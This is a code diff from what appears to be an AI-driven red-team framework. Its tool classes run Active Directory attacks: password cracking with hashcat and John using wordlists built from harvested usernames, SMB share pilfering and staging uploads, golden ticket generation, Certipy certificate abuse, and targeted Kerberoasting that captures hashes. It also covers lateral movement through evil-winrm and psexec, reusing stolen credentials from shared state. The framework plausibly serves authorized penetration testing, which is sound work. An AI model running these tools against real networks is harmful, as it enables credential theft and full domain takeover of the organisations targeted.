+        if not self.state:
+            return usernames
+        state = self.state  # Local reference for type narrowing
+        if hasattr(state, "all_users"):
+            for user in state.all_users:
+                if user.username:
+                    usernames.add(user.username)
+        if hasattr(state, "all_credentials"):
+            for cred in state.all_credentials:
+                if cred.username:
+                    usernames.add(cred.username)
+        if hasattr(state, "all_hashes"):
+            for hash_obj in state.all_hashes:
+                if hash_obj.username:
+                    usernames.add(hash_obj.username)
+        return usernames
+
+    def _generate_password_candidates(self, usernames: set[str]) -> set[str]:
+        """Generate password candidates from usernames."""
+        words: set[str] = set()
+        suffixes = ("", "1", "123", "!", "2024", "2025")
+
+        for username_raw in sorted(usernames):
+            username = (username_raw or "").strip()
+            if not username or username.lower() in {"guest"}:
+                continue
+            if "/" in username or "\\" in username or username.endswith(".txt"):
+                continue
+
+            base = username.lower()
+            parts = [p for p in re.split(r"[^a-z0-9]+", base) if p]
+
+            candidates = {base}
+            candidates.update(parts)
+            if len(parts) >= 2:
+                first, last = parts[0], parts[-1]
+                candidates.update(
+                    {first + last, last + first, f"{first[0]}{last}", f"{first}{last[0]}"}
+                )
+
+            for cand in candidates:
+                for variant in (cand, cand.capitalize(), cand.upper()):
+                    for suffix in suffixes:
+                        words.add(f"{variant}{suffix}")
+
+        return words
 
     @dn.tool_method
     async def crack_with_hashcat(
@@ -2563,6 +3042,7 @@ class CrackingTools(Toolset):
         hashcat_mode: int = 13100,
         wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
         max_time_minutes: int = 10,
+        use_dynamic_wordlist: bool = True,
     ) -> str:
         """
         Attempt to crack a password hash using hashcat (GPU-accelerated).
@@ -2592,6 +3072,11 @@ class CrackingTools(Toolset):
 
         # Create hash file remotely and run hashcat
         hash_file_path = f"/tmp/hash_{time.time()}.hash"  # noqa: S108  # nosec B108
+        dynamic_wordlist = self._build_user_wordlist() if use_dynamic_wordlist else None
+        if dynamic_wordlist:
+            wordlist_path = dynamic_wordlist
+            output += f"[*] Using wordlist: {wordlist_path}\n"
+            logger.info("[*] Using dynamic user-based wordlist for cracking")
 
         try:
             # Write hash to remote file and run hashcat
@@ -2617,6 +3102,12 @@ rm -f {hash_file_path}
 
         except Exception as e:
             return output + f"\nError: {e!s}"
+        finally:
+            if dynamic_wordlist:
+                try:
+                    os.remove(dynamic_wordlist)  # noqa: PTH107
+                except OSError:
+                    pass
 
     @dn.tool_method
     async def crack_with_john(
@@ -2625,6 +3116,7 @@ rm -f {hash_file_path}
         hash_format: str = "krb5asrep",
         wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
         max_time_minutes: int = 10,
+        use_dynamic_wordlist: bool = True,
     ) -> str:
         """
         Attempt to crack a password hash using John the Ripper (CPU-based).
@@ -2651,6 +3143,11 @@ rm -f {hash_file_path}
             >>> crack_with_john("aad3b435b51404ee...", "ntlm")
         """
         output = "[*] Starting John the Ripper...\n"
+        dynamic_wordlist = self._build_user_wordlist() if use_dynamic_wordlist else None
+        if dynamic_wordlist:
+            wordlist_path = dynamic_wordlist
+            output += f"[*] Using wordlist: {wordlist_path}\n"
+            logger.info("[*] Using dynamic user-based wordlist for cracking")
 
         hash_file_path = f"/tmp/john_hash_{time.time()}.hash"  # noqa: S108  # nosec B108
         session_name = f"john_session_{int(time.time())}"
@@ -2679,14 +3176,20 @@ rm -f {hash_file_path} {session_name}.pot {session_name}.rec {session_name}.log
 
         except Exception as e:
             return output + f"\nError: {e!s}"
+        finally:
+            if dynamic_wordlist:
+                try:
+                    os.remove(dynamic_wordlist)  # noqa: PTH107
+                except OSError:
+                    pass
 
 
 class SharePilferingTools(Toolset):
     """Tools for extracting credentials from SMB shares."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -2807,13 +3310,64 @@ class SharePilferingTools(Toolset):
             logger.error(f"[!] Error downloading file: {e!s}")
             return f"Error downloading file: {e!s}"
 
+    @dn.tool_method
+    def upload_file_to_share(
+        self,
+        target: str,
+        share_name: str,
+        local_path: str,
+        username: str,
+        password: str,
+        remote_path: str = "",
+    ) -> str:
+        """
+        Upload a local file to an SMB share for staging.
+
+        Args:
+            target: Target IP address
+            share_name: Name of the SMB share
+            local_path: Local file path to upload
+            username: Username for authentication
+            password: Password for authentication
+            remote_path: Optional destination path/name on the share
+
+        Returns:
+            Upload status message
+        """
+        if not os.path.isfile(local_path):  # noqa: PTH113
+            return f"[!] Local file not found: {local_path}"
+
+        share_path = f"//{target}/{share_name}"
+        put_command = f"put {local_path}"
+        if remote_path:
+            put_command = f"put {local_path} {remote_path}"
+
+        try:
+            cmd = [
+                "smbclient",
+                share_path,
+                "-U",
+                f"{username}%{password}",
+                "-c",
+                put_command,
+            ]
+            logger.info(f"[*] Uploading {local_path} to {share_path}")
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=120)
+            if returncode != 0:
+                logger.error(f"[!] Failed to upload file: {stderr}")
+                return f"Failed to upload file: {stderr}"
+            return stdout or f"[+] Uploaded {local_path} to {share_path}"
+        except Exception as e:
+            logger.error(f"[!] Error uploading file: {e!s}")
+            return f"Error uploading file: {e!s}"
+
 
 class GoldenTicketTools(Toolset):
     """Tools for Kerberos golden ticket generation and domain escalation."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -2916,15 +3470,16 @@ class GoldenTicketTools(Toolset):
             if self.state:
                 self.state.has_golden_ticket = True
                 # Add timeline event
-                event = TimelineEvent(
-                    id=f"evt-{len(self.state.timeline):04d}",
-                    timestamp=datetime.now(timezone.utc),
-                    description=f"Golden ticket generated for {domain}",
-                    mitre_techniques=["T1558.001"],  # Golden Ticket
-                    confidence=1.0,
-                    source="golden_ticket_generation",
-                )
-                self.state.timeline.append(event)
+                if hasattr(self.state, "timeline"):
+                    event = TimelineEvent(
+                        id=f"evt-{len(self.state.timeline):04d}",
+                        timestamp=datetime.now(timezone.utc),
+                        description=f"Golden ticket generated for {domain}",
+                        mitre_techniques=["T1558.001"],  # Golden Ticket
+                        confidence=1.0,
+                        source="golden_ticket_generation",
+                    )
+                    self.state.timeline.append(event)
 
             return stdout or stderr
         except Exception as e:
@@ -2934,9 +3489,9 @@ class GoldenTicketTools(Toolset):
 class BloodHoundTools(Toolset):
     """Tools for ACL recon and privilege escalation path discovery."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -3128,6 +3683,29 @@ class BloodHoundTools(Toolset):
             "-c",
             "All",
         ]
+        if dc_ip:
+            realm = domain.upper()
+            krb5_conf = f"/tmp/ares-krb5-{uuid.uuid4().hex}.conf"  # nosec B108  # noqa: S108
+            cmd_str = " ".join(shlex.quote(arg) for arg in cmd)
+            cmd_script = (
+                f"tmp_conf={krb5_conf}\n"
+                "trap 'rm -f \"$tmp_conf\"' EXIT\n"
+                "cat > \"$tmp_conf\" <<'EOF'\n"
+                "[libdefaults]\n"
+                f" default_realm = {realm}\n"
+                " dns_lookup_kdc = false\n"
+                " dns_lookup_realm = false\n"
+                "[realms]\n"
+                f" {realm} = {{\n"
+                f"  kdc = {dc_ip}\n"
+                " }\n"
+                "[domain_realm]\n"
+                f" .{domain} = {realm}\n"
+                f" {domain} = {realm}\n"
+                "EOF\n"
+                f'env KRB5_CONFIG="$tmp_conf" {cmd_str}\n'
+            )
+            cmd = ["bash", "-lc", cmd_script]
 
         try:
             logger.info(f"[*] Running BloodHound collection for {domain}")
@@ -3228,9 +3806,9 @@ class BloodHoundTools(Toolset):
 class CertipyTools(Toolset):
     """Tools for Active Directory Certificate Services exploitation."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -3332,7 +3910,7 @@ class CertipyTools(Toolset):
                         "parameters": {
                             "ca_name": template["ca"],
                             "template_name": template["name"],
-                            "target_upn": f"administrator@{self.state.target.domain if self.state else 'DOMAIN'}",
+                            "target_upn": f"administrator@{self.state.target.domain if self.state and self.state.target else 'DOMAIN'}",
                         },
                     }
                 )
@@ -3352,6 +3930,22 @@ class CertipyTools(Toolset):
                 )
 
         return result
+
+    def _resolve_host_or_ip(self, host: str) -> str:
+        if not host:
+            return host
+        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
+            return host
+        try:
+            socket.gethostbyname(host)
+            return host
+        except Exception:
+            pass
+        if self.state:
+            for entry in self.state.hosts:
+                if entry.hostname and entry.hostname.lower() == host.lower() and entry.ip:
+                    return entry.ip
+        return host
 
     @dn.tool_method
     def certipy_find(
@@ -3860,9 +4454,9 @@ class CertipyTools(Toolset):
 class DelegationTools(Toolset):
     """Tools for Kerberos delegation attacks (RBCD, unconstrained, constrained)."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -4200,11 +4794,15 @@ class DelegationTools(Toolset):
 class RedTeamReportingTools(Toolset):
     """Tools for recording findings and building the operation report."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
+    dispatcher: Any | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def set_dispatcher(self, dispatcher) -> None:
+        self.dispatcher = dispatcher
 
     def _record_host(self, data: dict[str, Any]) -> str:
         state = self.state
@@ -4257,11 +4855,15 @@ class RedTeamReportingTools(Toolset):
         )
         if hasattr(state, "add_credential"):
             state.add_credential(cred, "recon")
+            if self.dispatcher:
+                self.dispatcher.signal_credential_access()
         else:
             state.credentials.append(cred)
             cred_key = state.get_credential_key(cred.username, cred.password, cred.domain)
             state.tested_credentials.add(cred_key)
             _track_cross_domain_reuse(state, cred)
+            if self.dispatcher:
+                self.dispatcher.signal_credential_access()
 
         logger.info(f"[+] Recorded credential: {cred.username}@{cred.domain}")
         return f"✓ Recorded credential: {cred.username}@{cred.domain}"
@@ -4278,6 +4880,8 @@ class RedTeamReportingTools(Toolset):
             cracked_password=data.get("cracked_password", ""),
         )
         state.hashes.append(hash_obj)
+        if self.dispatcher:
+            self.dispatcher.signal_credential_access()
         logger.info(f"[+] Recorded hash for: {hash_obj.username}")
         return f"✓ Recorded hash for: {hash_obj.username}"
 
@@ -4291,7 +4895,10 @@ class RedTeamReportingTools(Toolset):
             permissions=data.get("permissions", ""),
             comment=data.get("comment", data.get("description", "")),
         )
-        state.shares.append(share)
+        if hasattr(state, "add_share"):
+            state.add_share(share)
+        else:
+            state.shares.append(share)
         logger.info(f"[+] Recorded share: {share.name} on {share.host}")
         return f"✓ Recorded share: {share.name} on {share.host}"
 
@@ -4352,15 +4959,16 @@ class RedTeamReportingTools(Toolset):
             )
 
         state.has_domain_admin = True
-        event = TimelineEvent(
-            id=f"evt-{len(state.timeline):04d}",
-            timestamp=datetime.now(timezone.utc),
-            description=f"Domain admin access achieved: {details}",
-            mitre_techniques=["T1078.002"],  # Domain Accounts
-            confidence=1.0,
-            source="domain_admin_checker",
-        )
-        state.timeline.append(event)
+        if hasattr(state, "timeline"):
+            event = TimelineEvent(
+                id=f"evt-{len(state.timeline):04d}",
+                timestamp=datetime.now(timezone.utc),
+                description=f"Domain admin access achieved: {details}",
+                mitre_techniques=["T1078.002"],  # Domain Accounts
+                confidence=1.0,
+                source="domain_admin_checker",
+            )
+            state.timeline.append(event)
         logger.info("[+] CRITICAL: Domain admin access recorded!")
         return "✓ CRITICAL: Domain admin access recorded!"
 
@@ -4474,9 +5082,9 @@ class CoercionTools(Toolset):
     listener, enabling relay attacks or TGT capture with unconstrained delegation.
     """
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -4607,9 +5215,9 @@ class CoercionTools(Toolset):
 class CoercionNetworkTools(Toolset):
     """Tools for network coercion (Responder, mitm6)."""
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -4713,9 +5321,9 @@ class MSSQLTools(Toolset):
     privilege escalation via impersonation chains.
     """
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -5112,9 +5720,9 @@ class ACLExploitTools(Toolset):
     permissions, use these tools to exploit them.
     """
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -5494,6 +6102,29 @@ class ACLExploitTools(Toolset):
 
             if "$krb5tgs$" in result:
                 logger.info("[+] Targeted Kerberoast successful - hash obtained!")
+                if self.state:
+                    matches = re.findall(r"(\$krb5tgs\$[^\s]+)", result)
+                    for value in matches:
+                        username_value = "Unknown"
+                        domain_value = ""
+                        parts = value.split("$")
+                        if len(parts) >= 5:
+                            user_part = parts[3].lstrip("*")
+                            realm_part = parts[4]
+                            if user_part:
+                                username_value = user_part
+                            if realm_part:
+                                domain_value = realm_part
+                        hash_obj = Hash(
+                            username=username_value,
+                            hash_value=value,
+                            hash_type="Kerberos",
+                            domain=domain_value or domain,
+                        )
+                        if hasattr(self.state, "add_hash"):
+                            self.state.add_hash(hash_obj, "targeted_kerberoast")
+                        else:
+                            self.state.hashes.append(hash_obj)
                 result = (
                     f"🚨 KERBEROAST HASH OBTAINED FOR {target_user}!\n"
                     "→ Use crack_with_hashcat with mode 13100 to crack\n"
@@ -5513,9 +6144,9 @@ class CVEExploitTools(Toolset):
     lead to privilege escalation or code execution.
     """
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -5644,9 +6275,9 @@ class TrustAttackTools(Toolset):
     and cross-forest attacks.
     """
 
-    state: RedTeamState | None = None
+    state: AnyRedTeamState | None = None
 
-    def set_state(self, state: RedTeamState) -> None:
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
 
@@ -5713,11 +6344,45 @@ class LateralMovementTools(Toolset):
     on compromised systems.
     """
 
-    state: RedTeamState | None = None
+    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = {"password", "changeme", "<password>"}
 
-    def set_state(self, state: RedTeamState) -> None:
+    state: AnyRedTeamState | None = None
+
+    def set_state(self, state: AnyRedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def _resolve_password(
+        self,
+        username: str,
+        domain: str | None,
+        password: str | None,
+    ) -> str | None:
+        if not password:
+            return password
+        normalized = password.strip().lower()
+        if normalized not in self._PLACEHOLDER_PASSWORDS:
+            return password
+        if not self.state:
+            return password
+        credentials = getattr(self.state, "all_credentials", None)
+        if credentials is None:
+            credentials = getattr(self.state, "credentials", [])
+        username_key = username.strip().lower()
+        domain_key = (domain or "").strip().lower()
+        for cred in credentials:
+            if cred.username.strip().lower() != username_key:
+                continue
+            if domain_key and cred.domain.strip().lower() != domain_key:
+                continue
+            if cred.password:
+                logger.info(
+                    "Replaced placeholder password for %s\\%s from shared state",
+                    cred.domain or domain,
+                    cred.username,
+                )
+                return cred.password
+        return password
 
     def _check_port(self, target: str, port: int, timeout_seconds: int = 5) -> bool:
         cmd = ["nc", "-zv", "-w", str(timeout_seconds), target, str(port)]
@@ -5791,17 +6456,27 @@ class LateralMovementTools(Toolset):
             >>> evil_winrm("192.168.56.22", "admin", password="pass")  # pragma: allowlist secret
             >>> evil_winrm("192.168.56.22", "admin", hash="aad3b435...")
         """
-        if not (self._check_port(target, 5985) or self._check_port(target, 5986)):
-            return f"[!] WinRM not reachable on {target} (ports 5985/5986 closed)"
-        cmd = ["evil-winrm", "-i", target, "-u", username]
-
-        if password:
-            cmd.extend(["-p", password])
-        elif hash:
-            cmd.extend(["-H", hash])
-        else:
+        if not (password or hash):
             return "[!] Error: Either password or hash must be provided"
 
+        if not (self._check_port(target, 5985) or self._check_port(target, 5986)):
+            logger.warning("WinRM not reachable on %s (ports 5985/5986 closed)", target)
+        resolved_password = self._resolve_password(username, domain, password)
+        if (
+            hash
+            and resolved_password
+            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
+        ):
+            resolved_password = None
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        cmd = ["evil-winrm", "-i", target, "-u", username]
+
+        if resolved_password:
+            cmd.extend(["-p", resolved_password])
+        elif hash:
+            cmd.extend(["-H", hash])
         # Execute a command and return (non-interactive)
         if command:
             cmd.extend(["-c", command])
@@ -5857,15 +6532,25 @@ class LateralMovementTools(Toolset):
         Example:
             >>> psexec("192.168.56.22", "admin", password="pass", command="whoami")  # pragma: allowlist secret
         """
-        precheck = self._check_smb_exec(target, username, password, hash, domain)
+        resolved_password = self._resolve_password(username, domain, password)
+        if (
+            hash
+            and resolved_password
+            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
+        ):
+            resolved_password = None
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        precheck = self._check_smb_exec(target, username, resolved_password, hash, domain)
         if precheck is False:
             return "[!] SMB exec precheck failed; admin access likely missing."
 
-        if hash and not password:
+        if hash and not resolved_password:
             target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
         else:
             target_string = f"{domain}/{username}" if domain else username
-            target_string += f":{password}@{target}" if password else f"@{target}"
+            target_string += f":{resolved_password}@{target}" if resolved_password else f"@{target}"
 
         cmd = ["impacket-psexec", target_string]
 
